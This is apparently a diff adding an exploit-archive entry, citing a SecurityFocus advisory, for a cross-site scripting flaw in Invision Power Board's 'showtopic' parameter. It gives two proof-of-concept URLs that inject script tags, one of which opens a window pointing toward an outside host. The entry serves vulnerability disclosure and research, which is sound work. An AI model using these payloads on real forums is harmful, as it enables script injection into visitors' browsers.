@@ -1,0 +1,8 @@
+source: http://www.securityfocus.com/bid/8575/info
+
+Invision Power Board is prone to a cross-site scripting vulnerability. It has been reported that a remote attacker may construct a malicious link to the index.php script and supply arbitrary HTML code as a value for the 'showtopic' URI parameter. If this link is followed, the content of the URI parameter will be rendered in the browser of the user who followed the link. 
+
+http://www.example.com/index.php?showtopic='><script>window.open
+(window.location.search.substring(79))
+</script>http://binaryvision.tech.nu?BoyBear$$$From$$$BinaryVision
+http://www.example.com/?showtopic='><script>alert(window.document.url)</script><plaintext> 
